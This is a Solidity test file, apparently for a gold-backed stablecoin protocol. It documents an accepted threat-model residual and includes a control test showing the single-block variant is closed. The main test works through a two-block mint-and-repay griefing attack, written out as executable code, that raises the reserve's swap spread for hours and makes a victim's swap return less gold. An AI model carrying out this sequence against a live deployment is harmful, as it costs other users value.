// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {FullStackHarness} from "../harness/FullStackHarness.sol";
import {GoldStabilityReserve} from "../../src/core/GoldStabilityReserve.sol";

/// @notice Pins accepted residual 7 of docs/THREAT_MODEL.md: the mint and
///         repay spread grief across two blocks. The burn floor is the supply at the start of the BLOCK of the burn, so a
///         mint in block N and a repay in block N+1 banks the inflated supply as the smoothed
///         supply. The reserve then prices every swap at the restricted spread for most of a day,
///         for the cost of 12 seconds of stability fee. Nothing is taken; the control test keeps
///         the single-block form closed. If the grief test fails, the residual has changed:
///         update the threat model.
contract TwoBlockSpreadGriefResidual is FullStackHarness {
    address internal other = address(0x0B0B);
    address internal atk = address(0xA77);
    address internal victim = address(0xF1C7);

    function _feeBps() internal pure override returns (uint256) {
        return 200; // 2% a year, so the attack pays a real fee
    }

    function _refresh() internal {
        _setPrice(PRICE);
        oracle.getTokenPrice(address(paxg));
    }

    function setUp() public override {
        super.setUp();
        // The launch curve from scripts/deploy.ts.
        GoldStabilityReserve.SpreadStep[] memory steps = new GoldStabilityReserve.SpreadStep[](4);
        steps[0] = GoldStabilityReserve.SpreadStep({coverageAtLeastPpm: 150_000, spreadPpm: 5_000});
        steps[1] = GoldStabilityReserve.SpreadStep({coverageAtLeastPpm: 100_000, spreadPpm: 5_000});
        steps[2] = GoldStabilityReserve.SpreadStep({coverageAtLeastPpm: 50_000, spreadPpm: 7_500});
        steps[3] = GoldStabilityReserve.SpreadStep({coverageAtLeastPpm: 20_000, spreadPpm: 12_500});
        reserve.setSpreadCurve(steps, 20_000);

        // Honest state: 1,000,000 GSUSD outstanding, $200k of reserve gold: 20% coverage, 0.5%.
        _open(other, paxg, 500e18, 1_000_000e18);
        paxg.mint(address(this), 50e18);
        paxg.approve(address(reserve), 50e18);
        reserve.seedCollateral(address(paxg), 50e18);
        vm.prank(other);
        gsusd.transfer(victim, 50_000e18);
        vm.warp(block.timestamp + 2 days);
        vm.roll(block.number + 14_400);
        _refresh();
    }

    function test_mintInOneBlockRepayInTheNextHoldsTheRestrictedSpreadForADay() public {
        uint256 supply = gsusd.totalSupply();
        assertEq(reserve.currentSpreadPpm(), 5_000, "honest spread 0.5%");
        (uint256 honestOut,) = reserve.quoteGoldOut(address(paxg), 50_000e18);

        // Block N: deposit 4,000 PAXG ($16M) and mint 10M GSUSD (160% ratio).
        paxg.mint(atk, 4_000e18);
        vm.startPrank(atk);
        paxg.approve(address(vault), 4_000e18);
        vault.deposit(address(paxg), 4_000e18);
        vault.mint(10_000_000e18);
        vm.stopPrank();

        // Block N+1, 12 seconds later: repay everything and take the gold back.
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        _refresh();
        uint256 owed = vault.getVaultCurrentDebt(atk);
        uint256 fee = owed - 10_000_000e18;
        _fundGsusd(atk, 1_000e18); // covers the fee; above minDebt
        vm.startPrank(atk);
        gsusd.approve(address(vault), type(uint256).max);
        vault.repay(type(uint256).max);
        vault.withdraw(4_000e18);
        vm.stopPrank();
        emit log_named_decimal_uint("attack cost, stability fee (GSUSD)", fee, 18);

        // The live supply is back (plus the throwaway funding vault), yet the smoothed supply
        // banked the 10M that stood at the start of block N+1.
        emit log_named_decimal_uint("live supply", gsusd.totalSupply(), 18);
        emit log_named_decimal_uint("smoothed supply", gsusd.smoothedSupplyNow(), 18);
        assertLt(gsusd.totalSupply(), supply + 1_001e18, "live supply restored");
        assertGt(gsusd.smoothedSupplyNow(), supply + 9_900_000e18, "smoothed supply holds the 10M");

        assertEq(reserve.currentSpreadPpm(), 20_000, "spread pushed to the restricted 2%");
        (uint256 griefedOut,) = reserve.quoteGoldOut(address(paxg), 50_000e18);
        emit log_named_decimal_uint("victim gold out, honest (PAXG)", honestOut, 18);
        emit log_named_decimal_uint("victim gold out, griefed (PAXG)", griefedOut, 18);
        vm.startPrank(victim);
        gsusd.approve(address(reserve), 50_000e18);
        uint256 got = reserve.swapGsusdForGold(address(paxg), 50_000e18, 0);
        vm.stopPrank();
        assertEq(got, griefedOut);
        assertLt(got, honestOut * 985 / 1000, "victim pays 1.5 points more");

        // Twelve hours on, still well above the honest tier.
        vm.warp(block.timestamp + 12 hours);
        vm.roll(block.number + 3_600);
        _refresh();
        emit log_named_uint("spread ppm after 12h", reserve.currentSpreadPpm());
        assertGt(reserve.currentSpreadPpm(), 5_000, "still elevated after 12 hours");
    }

    /// Control: the same mint and repay inside one block leaves the spread alone: a burn is
    /// damped from the supply at the start of its block, not from the supply the mint inflated.
    function test_control_sameBlockIsClosed() public {
        paxg.mint(atk, 4_000e18);
        vm.startPrank(atk);
        paxg.approve(address(vault), 4_000e18);
        vault.deposit(address(paxg), 4_000e18);
        vault.mint(10_000_000e18);
        gsusd.approve(address(vault), type(uint256).max);
        vault.repay(type(uint256).max);
        vm.stopPrank();
        assertEq(reserve.currentSpreadPpm(), 5_000, "one block: closed");
    }
}
